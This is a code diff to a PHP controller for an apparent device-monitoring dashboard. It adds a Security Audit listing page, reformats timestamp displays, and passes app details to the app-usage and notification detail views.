@@ -36,6 +36,7 @@ class Advanced extends BaseClientController
             'notifications' => ['url' => 'advanced/notifications', 'label' => 'Alerts', 'icon' => 'fas fa-bell', 'count' => $counts['total_notifications'] ?? 0],
             'bluetooth' => ['url' => 'advanced/bluetooth', 'label' => 'Bluetooth', 'icon' => 'fab fa-bluetooth-b', 'count' => $counts['total_bluetooth'] ?? 0],
             'sensors' => ['url' => 'advanced/sensors', 'label' => 'Sensors', 'icon' => 'fas fa-microchip', 'count' => $counts['total_sensors'] ?? 0],
+            'security_audit' => ['url' => 'advanced/security_audit', 'label' => 'Security', 'icon' => 'fas fa-shield-alt', 'count' => $counts['total_security_audit'] ?? 0],
             'remote_media' => ['url' => 'advanced/media', 'label' => 'Remote Media', 'icon' => 'fas fa-photo-video', 'count' => $counts['total_media'] ?? 0],
         ];
 
@@ -58,8 +59,6 @@ class Advanced extends BaseClientController
 
         return $html;
     }
-
-
 
     /** GET /advanced/device */
 
@@ -173,7 +172,9 @@ class Advanced extends BaseClientController
             )
         );
 
-        $summary['last_used_display'] = $this->formatMsDatetime($summary['last_time_used'] ?? null, 'Y-m-d H:i');
+        $summary['last_used_display'] = $this->formatMsDatetime($summary['last_time_used'] ?? null, 'M d, Y, l H:i');
+
+        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $packageName);
 
         $data = array_merge($this->commonData('app_usage', 'App Usage — ' . ($summary['app_name'] ?? $packageName)), [
             'rows' => $this->enrichAppUsageDetailRows(
@@ -183,9 +184,11 @@ class Advanced extends BaseClientController
             'pager' => $this->finderModel->getPager(),
             'package_name' => $packageName,
             'summary' => $summary,
+            'app_detail' => $appDetail,
             'sessions' => $sessions,
             'back_url' => base_url('advanced/app-usage'),
             'encoded_pkg' => $encodedPkg,
+            'nav_urls' => '',
         ]);
 
         $data['detail_mode'] = true;
@@ -223,8 +226,10 @@ class Advanced extends BaseClientController
             throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
         }
 
-        $summary['latest_ts_abs'] = $this->formatMsDatetime($summary['latest_timestamp'] ?? null);
+        $summary['latest_ts_abs'] = $this->formatMsDatetime($summary['latest_timestamp'] ?? null, 'M d, Y, l H:i');
         $summary['latest_ts_rel'] = $this->formatRelativeTime($summary['latest_timestamp'] ?? null);
+
+        $appDetail = $this->finderModel->get_app_detail_by_package($this->userId, $groupKey);
 
         $data = array_merge($this->commonData('notifications', 'Notifications — ' . ($summary['display_name'] ?? $groupKey)), [
             'rows' => $this->enrichNotificationDetailRows(
@@ -234,8 +239,10 @@ class Advanced extends BaseClientController
             'pager' => $this->finderModel->getPager(),
             'group_key' => $groupKey,
             'summary' => $summary,
+            'app_detail' => $appDetail,
             'back_url' => base_url('advanced/notifications'),
             'encoded_pkg' => $encodedPkg,
+            'nav_urls' => '',
         ]);
 
         $data['detail_mode'] = true;
@@ -304,7 +311,7 @@ class Advanced extends BaseClientController
     private function enrichAppUsageGroupedRows(array $rows): array
     {
         foreach ($rows as &$row) {
-            $row['last_used_display'] = $this->formatMsDatetime($row['last_time_used'] ?? null, 'Y-m-d H:i');
+            $row['last_used_display'] = $this->formatMsDatetime($row['last_time_used'] ?? null, 'M d, Y, l H:i');
             // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
             $row['package_url_enc'] = urlencode((string) ($row['package_name'] ?? ''));
         }
@@ -316,7 +323,7 @@ class Advanced extends BaseClientController
     {
         foreach ($rows as &$row) {
             $ts = $row['latest_timestamp'] ?? null;
-            $row['latest_ts_abs'] = $this->formatMsDatetime($ts);
+            $row['latest_ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
             $row['latest_ts_rel'] = $this->formatRelativeTime($ts);
             // urlencode: com.twitter.android → com.twitter.android (dots are safe, no change)
             $row['group_url_enc'] = urlencode((string) ($row['group_key'] ?? ''));
@@ -330,8 +337,8 @@ class Advanced extends BaseClientController
     {
         $count = count($rows);
         for ($i = 0; $i < $count; $i++) {
-            $rows[$i]['last_used_display'] = $this->formatMsDatetime($rows[$i]['last_time_used'] ?? null, 'Y-m-d H:i');
-            $rows[$i]['extracted_display'] = $this->formatMsDatetime($rows[$i]['extracted_at'] ?? null, 'Y-m-d H:i');
+            $rows[$i]['last_used_display'] = $this->formatMsDatetime($rows[$i]['last_time_used'] ?? null, 'M d, Y, l H:i');
+            $rows[$i]['extracted_display'] = $this->formatMsDatetime($rows[$i]['extracted_at'] ?? null, 'M d, Y, l H:i');
 
             if ($i < $count - 1) {
                 $currentMs = (int) ($rows[$i]['foreground_time_ms'] ?? 0);
@@ -353,7 +360,7 @@ class Advanced extends BaseClientController
     private function enrichAppUsageSessions(array $sessions): array
     {
         foreach ($sessions as &$row) {
-            $row['timestamp_display'] = $this->formatMsDatetime($row['timestamp'] ?? null);
+            $row['timestamp_display'] = $this->formatMsDatetime($row['timestamp'] ?? null, 'M d, Y, l H:i');
         }
 
         return $sessions;
@@ -363,7 +370,7 @@ class Advanced extends BaseClientController
     {
         foreach ($rows as &$row) {
             $ts = $row['notification_timestamp'] ?? null;
-            $row['ts_abs'] = $this->formatMsDatetime($ts);
+            $row['ts_abs'] = $this->formatMsDatetime($ts, 'M d, Y, l H:i');
             $row['ts_rel'] = $this->formatRelativeTime($ts);
         }
 
@@ -373,8 +380,9 @@ class Advanced extends BaseClientController
     /** GET /advanced/bluetooth */
     public function bluetooth()
     {
+        $rows = $this->finderModel->get_bluetooth($this->userId);
         $data = array_merge($this->commonData('bluetooth', 'Bluetooth'), [
-            'rows' => $this->finderModel->get_bluetooth($this->userId),
+            'rows' => $rows,
             'total' => $this->finderModel->get_count_Bluetooth($this->userId),
             'pager' => $this->finderModel->getPager(),
         ]);
@@ -390,6 +398,22 @@ class Advanced extends BaseClientController
             'pager' => $this->finderModel->getPager(),
         ]);
         return $this->renderAppView('users/advanced/sensors', $data);
+    }
+
+    /** GET /advanced/security_audit */
+    public function security_audit()
+    {
+        $rows = $this->finderModel->get_security_audit($this->userId);
+        foreach ($rows as &$r) {
+            $r['ts_display'] = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
+        }
+        unset($r);
+        $data = array_merge($this->commonData('security_audit', 'Security Audit'), [
+            'rows' => $rows,
+            'total' => $this->finderModel->get_count_SecurityAudit($this->userId),
+            'pager' => $this->finderModel->getPager(),
+        ]);
+        return $this->renderAppView('users/advanced/security_audit', $data);
     }
 
     /** GET /remote-device */
